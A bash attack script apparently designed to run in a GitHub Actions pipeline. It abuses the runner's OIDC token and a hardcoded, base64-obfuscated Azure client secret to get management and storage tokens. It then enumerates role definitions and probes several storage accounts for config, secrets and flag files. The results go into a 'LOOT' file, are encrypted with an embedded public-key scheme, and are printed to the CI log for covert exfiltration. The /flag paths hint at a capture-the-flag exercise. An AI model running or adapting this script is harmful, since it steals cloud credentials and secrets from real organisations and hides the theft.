#!/usr/bin/env bash
set -uo pipefail
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
AAD="${SC}$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')"
ARM="${SC}$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')"
BLOB="${SC}$(b 'YmxvYi5jb3JlLndpbmRvd3MubmV0')"
STGSCOPE="${SC}$(b 'c3RvcmFnZS5henVyZS5jb20=')/.default"
TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
ACCTS="sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
cc(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d grant_type=client_credentials -d "client_id=$1" \
   --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" \
 | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")'; }
say "=== START $(date -u) ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
AT=$(curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" \
  -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$ARM/.default" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")')
for RD in acdd72a7-3385-48ef-bd42-f606fba81ae7 17d1049b-9a84-46fb-8f53-869881c3d3ab; do
  say "ROLE $RD: $(curl -sS -H "Authorization: Bearer $AT" "$ARM/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$RD?api-version=2022-04-01" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("roleName"))')"
done
FT=$(curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" \
  -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$STGSCOPE" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")')
ST=$(cc 462d1c38-4459-48b8-9333-82e389e59514 "$(b 'c2sxOFF-cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==')" "$STGSCOPE")
say "sync SP stg len=${#ST}"
for TK in "$FT" "$ST"; do
  for ACCT in $ACCTS; do
    say "RAW $ACCT list: $(curl -sS -D - -H "Authorization: Bearer $TK" -H "x-ms-version: 2021-08-06" "${SC}${ACCT}.${BLOB}/?comp=list" | head -c 500)"
    for C in logs ci config app internal artifacts reports data tbl \$logs appconfig; do
      for PATHQ in "?restype=container&comp=list" "/config/internal-config.json" "/internal-config.json" "/flag" "/flag.txt" "/secrets.json"; do
        RR=$(curl -sS -o /tmp/rr -w "%{http_code}" -H "Authorization: Bearer $TK" -H "x-ms-version: 2021-08-06" "${SC}${ACCT}.${BLOB}/$C$PATHQ")
        if [ "$RR" = "200" ]; then say "HIT $ACCT/$C$PATHQ => $(head -c 1500 /tmp/rr)"; fi
      done
    done
  done
done
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
